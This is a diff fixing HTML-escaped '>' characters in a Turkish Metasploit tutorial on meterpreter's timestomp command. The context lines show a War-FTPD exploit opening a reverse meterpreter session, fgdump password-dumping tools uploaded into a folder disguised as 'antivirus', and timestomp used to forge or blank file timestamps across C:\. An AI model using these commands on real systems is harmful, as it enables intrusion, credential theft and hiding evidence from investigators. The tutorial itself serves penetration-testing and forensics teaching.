@@ -50,7 +50,7 @@ Yukarıda, `test.txt` isimli dosyanın zaman kayıtlarını görebiliriz. Şimdi
 
 
 ```bash
-msf exploit**(**warftpd_165_user**)** **&gt;** exploit
+msf exploit**(**warftpd_165_user**)** **>** exploit
 
 **[*********]** Handler binding to LHOST 0.0.0.0
 **[*********]** Started reverse handler
@@ -62,8 +62,8 @@ msf exploit**(**warftpd_165_user**)** **&gt;** exploit
 **[*********]** Sleeping before handling stage...
 **[*********]** Uploading DLL **(**75787 bytes**)**...
 **[*********]** Upload completed.
-**[*********]** meterpreter session 1 opened **(**172.16.104.130:4444 -&gt; 172.16.104.145:1218**)**
-meterpreter **&gt;** use priv
+**[*********]** meterpreter session 1 opened **(**172.16.104.130:4444 -> 172.16.104.145:1218**)**
+meterpreter **>** use priv
 Loading extension priv...success.
 ```
 
@@ -73,7 +73,7 @@ Meterpreter shell açıldıktan sonra `timestomp -h` komutu ile yardım bilgiler
 
 
 ```bash
-meterpreter **&gt;** timestomp -h
+meterpreter **>** timestomp -h
 
 Usage: timestomp OPTIONS file_path
 
@@ -97,16 +97,16 @@ OPTIONS:
 
 
 ```bash
-meterpreter **&gt;** pwd
+meterpreter **>** pwd
 C:\Program Files\War-ftpd
-meterpreter **&gt;** cd ..
-meterpreter **&gt;** pwd
+meterpreter **>** cd ..
+meterpreter **>** pwd
 C:Program Files
-meterpreter **&gt;** cd ..
-meterpreter **&gt;** cd Documents\ and\ Settings
-meterpreter **&gt;** cd P0WN3D
-meterpreter **&gt;** cd My\ Documents
-meterpreter **&gt;** ls
+meterpreter **>** cd ..
+meterpreter **>** cd Documents\ and\ Settings
+meterpreter **>** cd P0WN3D
+meterpreter **>** cd My\ Documents
+meterpreter **>** ls
 
 Listing: C:\Documents and Settings\P0WN3D\My Documents
 **======================================================**
@@ -125,7 +125,7 @@ Bulunduğumuz klasördeki `test.txt` dosyasının zaman bilgilerini `-v` seçene
 
 
 ```bash
-meterpreter **&gt;** timestomp test.txt -v
+meterpreter **>** timestomp test.txt -v
 Modified      : Sun May 03 04:30:36 -0400 2009
 Accessed      : Sun May 03 04:31:51 -0400 2009
 Created       : Sun May 03 04:30:08 -0400 2009
@@ -142,9 +142,9 @@ Bu dosyayı sizin oluşturduğunuzu düşünün. Bunu değiştirmek isteyebilirs
 
 
 ```bash
-meterpreter **&gt;** timestomp test.txt -f C:\\WINNT\\system32\\cmd.exe
+meterpreter **>** timestomp test.txt -f C:\\WINNT\\system32\\cmd.exe
 **[*********]** Setting MACE attributes on test.txt from C:\WINNT\system32\cmd.exe
-meterpreter **&gt;** timestomp test.txt -v
+meterpreter **>** timestomp test.txt -v
 Modified      : Tue Dec 07 08:00:00 -0500 1999
 Accessed      : Sun May 03 05:14:51 -0400 2009
 Created       : Tue Dec 07 08:00:00 -0500 1999
@@ -181,15 +181,15 @@ Ayıca, `test.txt` dosyasının `accessed time` değerinin dosyanın bilgilerini
 
 
 ```bash
-meterpreter **&gt;** timestomp test.txt -v
+meterpreter **>** timestomp test.txt -v
 Modified      : Tue Dec 07 08:00:00 -0500 1999
 Accessed      : Sun May 03 05:16:20 -0400 2009
 Created       : Tue Dec 07 08:00:00 -0500 1999
 Entry Modified: Sun May 03 05:11:16 -0400 2009
 
-meterpreter **&gt;** timestomp test.txt -b
+meterpreter **>** timestomp test.txt -b
 **[*********]** Blanking file MACE attributes on test.txt
-meterpreter **&gt;** timestomp test.txt -v
+meterpreter **>** timestomp test.txt -v
 Modified      : 2106-02-06 23:28:15 -0700
 Accessed      : 2106-02-06 23:28:15 -0700
 Created       : 2106-02-06 23:28:15 -0700
@@ -222,20 +222,20 @@ Linux Meterpreter içerisinde 2106 yılı, Windows içinde 1601 oarak görülmek
 
 
 ```bash
-meterpreter **&gt;** cd C:\\WINNT
-meterpreter **&gt;** mkdir antivirus
+meterpreter **>** cd C:\\WINNT
+meterpreter **>** mkdir antivirus
 Creating directory: antivirus
-meterpreter **&gt;** cd antivirus
-meterpreter **&gt;** pwd
+meterpreter **>** cd antivirus
+meterpreter **>** pwd
 C:\WINNT\antivirus
-meterpreter **&gt;** upload /usr/share/windows-binaries/fgdump c:\\WINNT\\antivirus\\
-**[*********]** uploading  : /usr/share/windows-binaries/fgdump/servpw.exe -&gt; c:WINNTantivirusPwDump.exe
-**[*********]** uploaded   : /usr/share/windows-binaries/fgdump/servpw.exe -&gt; c:WINNTantivirusPwDump.exe
-**[*********]** uploading  : /usr/share/windows-binaries/fgdump/cachedump64.exe -&gt; c:WINNTantivirusLsaExt.dll
-**[*********]** uploaded   : /usr/share/windows-binaries/fgdump/cachedump64.exe -&gt; c:WINNTantivirusLsaExt.dll
-**[*********]** uploading  : /usr/share/windows-binaries/fgdump/pstgdump.exe -&gt; c:WINNTantiviruspwservice.exe
-**[*********]** uploaded   : /usr/share/windows-binaries/fgdump/pstgdump.exe -&gt; c:WINNTantiviruspwservice.exe
-meterpreter **&gt;** ls
+meterpreter **>** upload /usr/share/windows-binaries/fgdump c:\\WINNT\\antivirus\\
+**[*********]** uploading  : /usr/share/windows-binaries/fgdump/servpw.exe -> c:WINNTantivirusPwDump.exe
+**[*********]** uploaded   : /usr/share/windows-binaries/fgdump/servpw.exe -> c:WINNTantivirusPwDump.exe
+**[*********]** uploading  : /usr/share/windows-binaries/fgdump/cachedump64.exe -> c:WINNTantivirusLsaExt.dll
+**[*********]** uploaded   : /usr/share/windows-binaries/fgdump/cachedump64.exe -> c:WINNTantivirusLsaExt.dll
+**[*********]** uploading  : /usr/share/windows-binaries/fgdump/pstgdump.exe -> c:WINNTantiviruspwservice.exe
+**[*********]** uploaded   : /usr/share/windows-binaries/fgdump/pstgdump.exe -> c:WINNTantiviruspwservice.exe
+meterpreter **>** ls
 
 Listing: C:\WINNT\antivirus
 **===========================**
@@ -245,7 +245,7 @@ Mode              Size    Type  Last modified                   Name
 100777/rwxrwxrwx  174080  fil   2017-05-09 15:23:19 -0600  cachedump64.exe
 100777/rwxrwxrwx  57344   fil   2017-05-09 15:23:20 -0600  pstgdump.exe
 100777/rwxrwxrwx  57344   fil   2017-05-09 15:23:18 -0600  servpw.exe
-meterpreter **&gt;** cd ..
+meterpreter **>** cd ..
 ```
 
 
@@ -254,12 +254,12 @@ Artık Windows içerisine `antivirus` klasörünün içerisine yüklediğimiz 3 
 
 
 ```bash
-meterpreter **&gt;** timestomp antivirus\\servpw.exe -v
+meterpreter **>** timestomp antivirus\\servpw.exe -v
 Modified      : 2017-05-09 16:23:18 -0600
 Accessed      : 2017-05-09 16:23:18 -0600
 Created       : 2017-05-09 16:23:18 -0600
 Entry Modified: 2017-05-09 16:23:18 -0600
-meterpreter **&gt;** timestomp antivirus\\pstgdump.exe -v
+meterpreter **>** timestomp antivirus\\pstgdump.exe -v
 Modified      : 2017-05-09 16:23:20 -0600
 Accessed      : 2017-05-09 16:23:19 -0600
 Created       : 2017-05-09 16:23:19 -0600
@@ -272,10 +272,10 @@ Entry Modified: 2017-05-09 16:23:20 -0600
 
 
 ```bash
-meterpreter **&gt;** timestomp antivirus -r
+meterpreter **>** timestomp antivirus -r
 **[*********]** Blanking directory MACE attributes on antivirus
 
-meterpreter **&gt;** ls
+meterpreter **>** ls
 40777/rwxrwxrwx   0      dir   1980-01-01 00:00:00 -0700  ..
 100666/rw-rw-rw-  115    fil   2106-02-06 23:28:15 -0700  servpw.exe
 100666/rw-rw-rw-  12165  fil   2106-02-06 23:28:15 -0700  pstgdump.exe
@@ -299,12 +299,12 @@ Bu durum, sisteme bir müdahale olduğunu açık olarak ortaya koymakla birlikte
 
 
 ```bash
-meterpreter **&gt;** pwd
+meterpreter **>** pwd
 C:WINNT\antivirus
-meterpreter **&gt;** cd ../..
-meterpreter **&gt;** pwd
+meterpreter **>** cd ../..
+meterpreter **>** pwd
 C:
-meterpreter **&gt;** ls
+meterpreter **>** ls
 
 Listing: C:\
 **============**
@@ -327,10 +327,10 @@ Mode              Size       Type  Last modified                   Name
 100444/r--r--r--  214416     fil   Wed Dec 31 19:00:00 -0500 1969  ntldr                     
 100666/rw-rw-rw-  402653184  fil   Wed Dec 31 19:00:00 -0500 1969  pagefile.sys              
 
-meterpreter **&gt;** timestomp C:\\ -r
+meterpreter **>** timestomp C:\\ -r
 **[*********]** Blanking directory MACE attributes on C:\
-meterpreter **&gt;** ls
-meterpreter **&gt;** ls
+meterpreter **>** ls
+meterpreter **>** ls
 
 Listing: C:\
 **============**
